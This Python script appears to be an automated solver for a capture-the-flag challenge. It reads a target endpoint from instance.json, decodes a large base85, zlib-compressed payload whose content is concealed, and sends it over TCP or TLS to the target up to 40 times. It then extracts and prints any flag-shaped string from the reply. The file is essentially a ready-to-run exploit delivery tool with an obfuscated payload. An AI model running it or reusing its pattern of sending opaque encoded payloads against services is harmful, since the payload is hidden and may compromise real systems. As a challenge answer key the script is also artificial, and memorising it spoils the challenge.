#!/usr/bin/env python3
import base64
import json
import re
import socket
import ssl
import sys
import zlib
from pathlib import Path


ROOT = Path(__file__).resolve().parent
PAYLOAD_B85 = r'''c-qZcZFAc;68`RA!D{9@R88ynPTQ*P#&(h>os8W{dUqc@nhYdC5*wP-KvWdB^?&aISdaiHnd#&@cba5G?ml<`EEWsw$_1^Rn&qn%WzNJ|l4488Cj|(%HQBB~^xKns7thWwWPa)RpW`4798^3I_K`9l)S+_<y1);d@0{D+!;G@g%b(uAd3$#Yf>1{X8anJnhZ;KSMMoMs?nTEMI_X6x8anMory4rzMQ0lN{26pXeto<ljOCP#PnNrKUguQ_93Sc1R^twx-%cF(Fk0_e>D&jwDDZ-C6na54io75m#a@t%5-&(csTX9U%nQy(=hN}Y(@D#^$v;(f!<8=`_ZxJUp^&sajK%xi>=!z(M+>^lOZpS5Hk8$m?iFL?akODoUDb~p>N&oLjQq2rq6an7I2=1qp0fq%2N1*KyegOZYRAZ|pqJpRJ1W{f4f$Bh>P=ZdXRa73h}ywdo7$z@IoVJ(0d79RJ+-8JM~uonAC5tEA5JIhF?>h(9piU`-zk1)(+T?fxMd8wi~%wR$QU4FfQ$h$1}$TtF@{~n5E(;c43RNJ#t<39mNC>Aqb_5Fj1e+M$QU7Ggp5(k7-@`gmoY}h7#U+^jFB-$#<*pSHO8dNm>^?<j0rL($e18w(lRC*W7=g*kugQa6d6-wOp!5d8B>ih>oR7@m?2|^j2SX!$e6W^nPkN6HEwp7>8|`E!tjXr6XK8YIhc?@J%<w#s^@4zaDB9f@r1+*kW5ITp3@0Q)pIr>+1T38uqmYINe?6W_Elbz;%5<IjO_=Tjc-0~qh($cl)Z;QQLeUzxdNYm0Jp4|<8o{cdVdUG-<!=w1ua+gdhDE@<}%b6>ic{O4du&d$*PB&HDNc^g1Tt}A=J&Czd2z#^qe$pUK9SBHLvk-2+z5UsWo8`hK^9eG2+3Y2LI3H{~++9Nd6nj_M3f47qaa!k^mxaZ~^~)B=c>OeZ`7Ck_*v$5X3l|4hh?%#s8I;^*Ne7MI}ViPn2yTI9~6TOL5{iiz6l6qb=yGq9QdS#d8`<TAQuY@=dAQUFR!4o}QMUatPcH_69rXEa#eM$Y#<da(;l0!bB31a=xzkEbj+DUfq1Sy1jXQ_wGZoyokctz;lG~T0PvThZpMMrFwX!9)3^{uLp2ab{u_I6xxxzEy-rPuIj7Bg3;}kZe9Hx;thU$e|J0D5Voc6ik6g-n!cuF^Bx<%s@M-VFX(KyT0sx)aM;G765L^nw=*T%GqTyxg(aOAg!gSpVL-d0)`W+Qyd8;dn!O0doj92uorL}#aj*h>37R)pie%cx6&&6(=u|`Fun(edxbBub=xS&lPN#avYCY-}AYxW+7#EJwm9xDmJ8TuYSlL#Ib*qSo0v8=IU;)PQjSUF>Tr*-}A`Qb21VQu7Wa0$Qx8FL=Thv~^gt4l!&dVJ&`Ae`+LodxGy0p5GFd!YQ2hQ)mJMFuSik46db(ThpUzUdLErDDYODGp*pj%QNJ=|6AIgY!4a=F%K!Bm@3cUIV!X|XnL;DVck&+(~YcK8gZ`f@%nPM523#A7^9nx}8T<h2V#XWTdrk@03SfF{yfl5Gm_1GNo>R&7aLFE*agsx64x;n!>lKILXAQ!(+@{Pv0q=gk*AR>WCLnlp|&Fm|Ak)9M<9tA@5gd&kPRVH=waCzQ*1LyN+>-qkf_%i_^mTItIpN!Nh-z52kAG;jNF3`x>`;gF0wp(Nm!L6MzONJPcbbx*(X39cE}eOQaNkoeKsQp(VyBc#NFiD0CowCH3(MRd}kTDY>HY_H?k-crle(;-rF5cXlFOxkVGSlenT*Wz$XYn_aQS6t`m!p#?IM{W0cJzqPTWKOo!@h{clsq|vpDg#>?Xv)x5hMF?6m64{5ZDp(}6I+>R%G6e3KDMAs0-k4UGv%XtAw#BJaH0A$#xXK|%Qi;NZkfi&zAeibd9-C1BO|u#V&t}#S&S^zwu+H(nnuYN|H<q1TM@Kf8M~Dwp1E_|QC&IR5W~NSIml*38ks{Lh#_ZzS$A6UJOfti9of5#?3?w`Q;U0_Uk5<zoH_pI(APd#jY4uOm4SAmGd{bjnvK=NHBqI{8JU0FZSL-__19Kiv4u#T_|>`Hd(ane(%kU{Y9#8ShMmvx%t3u%>tzA;v}td`!yb5G!lNE|Xu{(jcx1wp9(ZiR(;j$Y!m}QDs^Ha(A2;ZRmL1yU9?v0wLNW^O<J#v+lQ5BTkuM+>y8^7)mKSG}i_|aWlkzj8)%C$v7u{BEk(E_5>dwHw>?9&D7xXjm$x^WEnj^<k2i#vY<{3s@4u{U)o%3?osps(Ap;~fl-3!`It|W%R=Pbw5nnAOTP+fO1*NDMWj1T8bK;(rBso@^xHLut0^6{;uIIrZDr4%zBIRDg_<5IJ-Y~1YBt_LXBZg($WRA<IQ;GpMgl9yt*&DMnhpZ!CV1RY7(kwhIy+>s<5N!pQQLo+1qSzc2f5Ai1JIa**m<SdBe?$J)W;~|GD_RzqSgnFg^6DfA|vJ;#=F}Aik?>Q8fk1}2IYz^O<<iB}0?KDNN|C5P|udkn-sEJk(5f=O+j%7Ns7X>c;1R-T!=f6@RZ)-&h3V3RJcRIY!rsHP-Ngp8Y14Mm*un!RQ0elJ2JwT-m?>Um&>#weweN83oPuIczkLpQ(Nd<}cc1<U+1)(j7Y(Z=b5?hekg6v>Y`z1A_BdM&FRB=ai=iD11T6}o|AzB>Eu26Y6g+S%u90HYxlL%BE&LU8GIE_H%kvsym2NMYq-Ck5X2!FC{ucZ+f_B!{jCTCV&q+!3;Pih{?o5iiytlEp;2VOD;+1vm|#~v@$PX{wvfEw-t10>cC6pjBBjs?##YXuFOA8RevgPVdM_~+q;pTV~u#?)6wiVEV6DiE2T!{{PsaOS*2m}{J5&y7q1O}2Tpd6a{F^ROx0ZM9=_ilc9S>$f^IKw8Knd(I)VCxN_I#kFp(BvBl1+?G%_@jr`lo0XW2>Pq&?e|u8avPWm!ytR=W=~2ROD_NXr8gm;Rh^m+m8YwIHGX6&a;;&qWdW6L;mi))fD_M5RwJY?DfzN7=FE9MCALK6u;DKsU^Ae}!wfB2h@9FeZG&BP!a*42P)k539&EeMyvjWQJ!lgq~to?xqH0%6f$iXVAJbdJBUDbqCKCiCrsvLAg9v+cLN96Gld2&Ra9+77#w<gvm<fgnEtH#zzXza6YkPu$rP;en@sjQY}ebK7hbH@c2630gq5^yb6aG?<kAw$3)utg-U'''
FLAG_RE = re.compile(rb"[A-Za-z][A-Za-z0-9_]{1,31}\{[^\r\n{}]{1,512}\}")


def load_endpoint() -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    return next(item for item in data["endpoints"] if item["name"] == "main")


def run_once(endpoint: dict, payload: bytes) -> bytes:
    raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=12)
    try:
        raw.settimeout(12)
        if endpoint["protocol"] != "tls":
            raw.sendall(payload)
            raw.shutdown(socket.SHUT_WR)
            chunks = []
            while chunk := raw.recv(65536):
                chunks.append(chunk)
            return b"".join(chunks)

        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        tls = ssl.create_default_context().wrap_bio(
            incoming, outgoing, server_hostname=endpoint["host"]
        )

        def flush() -> None:
            data = outgoing.read()
            if data:
                raw.sendall(data)

        def feed() -> bool:
            data = raw.recv(65536)
            if data:
                incoming.write(data)
                return True
            incoming.write_eof()
            return False

        while True:
            try:
                tls.do_handshake()
                flush()
                break
            except ssl.SSLWantReadError:
                flush()
                feed()
        tls.write(payload)
        flush()
        try:
            tls.unwrap()
        except ssl.SSLWantReadError:
            pass
        flush()
        raw.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            try:
                chunk = tls.read(65536)
            except ssl.SSLWantReadError:
                if feed():
                    continue
                break
            except ssl.SSLZeroReturnError:
                break
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)
    finally:
        raw.close()


def main() -> int:
    endpoint = load_endpoint()
    payload = zlib.decompress(base64.b85decode(PAYLOAD_B85))
    last_error = "flag not returned"
    for _ in range(40):
        try:
            output = run_once(endpoint, payload)
        except (OSError, ssl.SSLError) as exc:
            last_error = f"connection failed: {exc}"
            continue
        match = FLAG_RE.search(output)
        if match:
            sys.stdout.buffer.write(match.group(0))
            return 0
        last_error = "instance closed without a flag"
    print(last_error, file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
